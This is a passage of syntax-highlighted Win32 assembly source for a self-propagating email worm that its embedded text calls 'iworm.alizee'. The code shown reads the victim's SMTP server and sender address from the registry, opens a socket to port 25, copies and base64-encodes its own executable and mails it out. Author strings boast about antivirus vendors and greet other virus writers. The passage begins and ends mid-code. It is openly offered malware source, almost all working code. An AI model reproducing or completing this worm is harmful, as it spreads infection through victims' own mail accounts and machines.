+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ebp.viewhandle</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
+
+</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stackframe</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc0">
+
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":::iworm.alizee.by.mar00n!ikx2oo1:::"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"while typing this text i realize this text got added on many av"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"description sites, because this silly worm could be easily a"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"hype. i wonder which av claims '[companyname] stopped high risk"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"worm before it could escape!' or shit like that. heh, or they"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"boycot my virus because of this text. well, it is easy enough"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"for the poor av's to add this worm; since it was only released"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"as source in coderz#2... btw, loveletter*2 power in pure win32asm"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"and only a 4k exe file. heh, vbs kiddies, phear win32asm. :)"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"thx to: bumblebee!29a, asmodeus!ikx. greets to: starzer0!ikx,"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"t-2000!ir, ultras!mtx &amp; sweet gigabyte..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"btw,burgemeester van sneek: ik zoek nog een baantje..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(alignmentfillingtext)"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
+
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc5">share</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+
+                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stack2</span><span class="sc0">                 </span><span class="sc1">;some workspace</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">101h</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">WSAStartup</span><span class="sc0">                      </span><span class="sc1">;startup wsock services</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                               
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">socket</span><span class="sc0">                          </span><span class="sc1">;create socket</span><span class="sc0">
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">25</span><span class="sc0">                              </span><span class="sc1">;convert port to big/</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">htons</span><span class="sc0">                           </span><span class="sc1">;lil endian</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.sockaddr_in</span><span class="sc0"> \
+                                 </span><span class="sc5">.sin_family</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc0">   </span><span class="sc1">;setup connect info</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebp.sockaddr_in.sin_port</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szRegAccountInfo</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__porn</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SMTP Server"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">__porn</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readregkey</span><span class="sc0">
+                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">share_xit</span><span class="sc0">
+
+                </span><span class="sc1">;ebx = smtp server name from registry</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">gethostbyname</span><span class="sc0">                   </span><span class="sc1">;resolve</span><span class="sc0">
+
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">share_xit</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;no clue what i'm</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;doing here. ctrl+c/v</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;from my other source</span><span class="sc0">
+                                                        </span><span class="sc1">;but i hope eax=IP ;)</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.sockaddr_in.sin_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ssockaddr_in</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.sockaddr_in</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;handle</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">connect</span><span class="sc0">
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">share_xit</span><span class="sc0">
+                
+                </span><span class="sc1">;int     3</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maildata</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstrings</span><span class="sc0">                     </span><span class="sc1">;mail ourself</span><span class="sc0">
+
+</span><span class="sc5">clean_xit</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">closesocket</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">WSACleanup</span><span class="sc0">                      </span><span class="sc1">;disconnect</span><span class="sc0">
+
+</span><span class="sc5">share_xit</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stack2</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+
+</span><span class="sc5">sendstrings</span><span class="sc4">:</span><span class="sc0">    
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;ebx is now dest. email. add. esi=data</span><span class="sc0">
+                                        </span><span class="sc1">;and edi is socket handle</span><span class="sc0">
+
+</span><span class="sc5">parsemaildata</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">lodsb</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
+                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nsend</span><span class="sc0">
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
+                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">parsemaildata</span><span class="sc0">
+
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">fntable</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
+
+
+
+</span><span class="sc5">nsend</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stringsend</span><span class="sc0">
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">parsemaildata</span><span class="sc0">
+
+
+
+
+</span><span class="sc5">fntable</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">checkmailinput</span><span class="sc0">
+                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sendmailfrom</span><span class="sc0">
+                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sendmailto</span><span class="sc0">
+                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">senddate</span><span class="sc0">
+                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sendsubject</span><span class="sc0">
+                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sendbase64</span><span class="sc0">
+                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exitexit</span><span class="sc0">
+
+</span><span class="sc5">sendbase64</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;int     3</span><span class="sc0">
+
+                </span><span class="sc6">pushad</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">binsize</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;oursize*2+base64space</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">GlobalAlloc</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;one push for globalfree</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;one push for base64 fun                      </span><span class="sc0">
+
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
+
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+
+                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+
+</span><span class="sc1">;                mov     ecx,200h/4</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
+        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;200h bytes</span><span class="sc0">
+
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc2">1000h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">
+                        
+</span><span class="sc1">;                mov     ecx,0a00h/4</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;a00h bytes</span><span class="sc0">
+
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc2">2000h</span><span class="sc4">-</span><span class="sc2">0a00h</span><span class="sc4">)</span><span class="sc0">
+
+</span><span class="sc1">;                mov     ecx,400h/4</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
+        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;200h</span><span class="sc0">
+
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc2">1000h</span><span class="sc4">-</span><span class="sc2">400h</span><span class="sc4">)</span><span class="sc0">
+
+</span><span class="sc1">;                mov     ecx,200h/4</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
+        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;200h</span><span class="sc0">
+                
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;src</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">binsize</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;dest</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">binsize</span><span class="sc0">                     </span><span class="sc1">;in</span><span class="sc0">
+
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encodebase64</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0a0d3dh</span><span class="sc0">         </span><span class="sc1">; '=/cr/lf/z'</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;jqwerty forever :)</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stringsend</span><span class="sc0">
+
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">GlobalFree</span><span class="sc0">
+
+                </span><span class="sc6">popad</span><span class="sc0">
+                
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">parsemaildata</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">checkmailinput</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">300h</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.buffer</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;handle</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">recv</span><span class="sc0">
+
+                </span><span class="sc6">lodsw</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.buffer</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;codes match?</span><span class="sc0">
+                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">parsemaildata</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;no good code -return to clean_xit</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">sendmailfrom</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+
+
+</span><span class="sc1">;                call    __a</span><span class="sc0">
+</span><span class="sc1">;fromwho         db      "test@localhost",0</span><span class="sc0">
+</span><span class="sc1">;                __a:</span><span class="sc0">
+</span><span class="sc1">;                pop     esi</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szRegAccountInfo</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__s</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SMTP Email Address"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">__s</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readregkey</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stringsend</span><span class="sc0">                      </span><span class="sc1">;well guess. test! :)</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+</span><span class="sc5">smfx</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">parsemaildata</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">sendmailto</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">              
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stringsend</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+</span><span class="sc5">smtx</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">smfx</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">senddate</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushad</span><span class="sc0">
+                </span><span class="sc1">;int     3</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.buffer</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__x</span><span class="sc0">
+</span><span class="sc5">formdate</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ddd,dd MMM yyyy"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">__x</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">409h</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">GetDateFormatA</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
+                </span><span class="sc6">stosb</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__y</span><span class="sc0">
+</span><span class="sc5">formtime</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"HH:mm:ss"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc5">__y</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">409h</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">GetTimeFormatA</span><span class="sc0">
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'00- '</span><span class="sc0">
+                </span><span class="sc6">stosd</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03030h</span><span class="sc0">
+                </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;barf</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stringsend</span><span class="sc0">
+
+                </span><span class="sc6">popad</span><span class="sc0">
+
+</span><span class="sc5">gsxx</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">smtx</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">exitexit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;int     3</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">sendsubject</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">
+                </span><span class="sc1">;int     3</span><span class="sc0">
+
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gendata</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.buffer</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+
+</span><span class="sc5">hehe</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">lodsb</span><span class="sc0">
+
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
+                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">done</span><span class="sc0">
+
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_range</span><span class="sc0">
+                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+
